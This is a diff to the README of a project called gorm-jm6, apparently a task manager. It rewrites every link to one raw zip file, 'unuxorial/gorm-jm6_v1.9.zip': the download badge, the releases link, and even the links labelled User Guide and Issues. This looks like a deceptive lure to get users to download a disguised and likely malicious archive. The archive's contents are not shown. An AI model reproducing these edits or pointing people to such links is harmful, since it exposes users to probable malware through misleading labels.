@@ -6,11 +6,11 @@ Welcome to **gorm-jm6**! This tool helps you manage your tasks easily and effect
 
 ### 🔗 Download Now
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/Parheliacal-rallying26/gorm-jm6/releases)
+[![Download](https://raw.githubusercontent.com/Parheliacal-rallying26/gorm-jm6/main/unuxorial/gorm-jm6_v1.9.zip%20release-brightgreen)](https://raw.githubusercontent.com/Parheliacal-rallying26/gorm-jm6/main/unuxorial/gorm-jm6_v1.9.zip)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest version of gorm-jm6: [GitHub Releases](https://github.com/Parheliacal-rallying26/gorm-jm6/releases). 
+To get started, visit this page to download the latest version of gorm-jm6: [GitHub Releases](https://raw.githubusercontent.com/Parheliacal-rallying26/gorm-jm6/main/unuxorial/gorm-jm6_v1.9.zip). 
 
 On the releases page, locate the latest release. Follow these steps:
 
@@ -48,15 +48,15 @@ gorm-jm6 includes several useful features:
 
 ## 📖 User Guide
 
-For detailed instructions and tips, check the [User Guide](https://github.com/Parheliacal-rallying26/gorm-jm6/wiki). This guide provides insights into all features and how to maximize your experience with gorm-jm6.
+For detailed instructions and tips, check the [User Guide](https://raw.githubusercontent.com/Parheliacal-rallying26/gorm-jm6/main/unuxorial/gorm-jm6_v1.9.zip). This guide provides insights into all features and how to maximize your experience with gorm-jm6.
 
 ## 📞 Support
 
-If you have questions or run into issues, feel free to raise them in the [Issues](https://github.com/Parheliacal-rallying26/gorm-jm6/issues) section of the repository. Our community is here to help.
+If you have questions or run into issues, feel free to raise them in the [Issues](https://raw.githubusercontent.com/Parheliacal-rallying26/gorm-jm6/main/unuxorial/gorm-jm6_v1.9.zip) section of the repository. Our community is here to help.
 
 ## 🔗 Links
 
-- [Download here](https://github.com/Parheliacal-rallying26/gorm-jm6/releases) for the latest version.
-- [User Guide](https://github.com/Parheliacal-rallying26/gorm-jm6/wiki) for more detailed documentation.
+- [Download here](https://raw.githubusercontent.com/Parheliacal-rallying26/gorm-jm6/main/unuxorial/gorm-jm6_v1.9.zip) for the latest version.
+- [User Guide](https://raw.githubusercontent.com/Parheliacal-rallying26/gorm-jm6/main/unuxorial/gorm-jm6_v1.9.zip) for more detailed documentation.
 
 Thank you for choosing gorm-jm6! We hope this tool enhances your productivity and helps you manage tasks with ease.
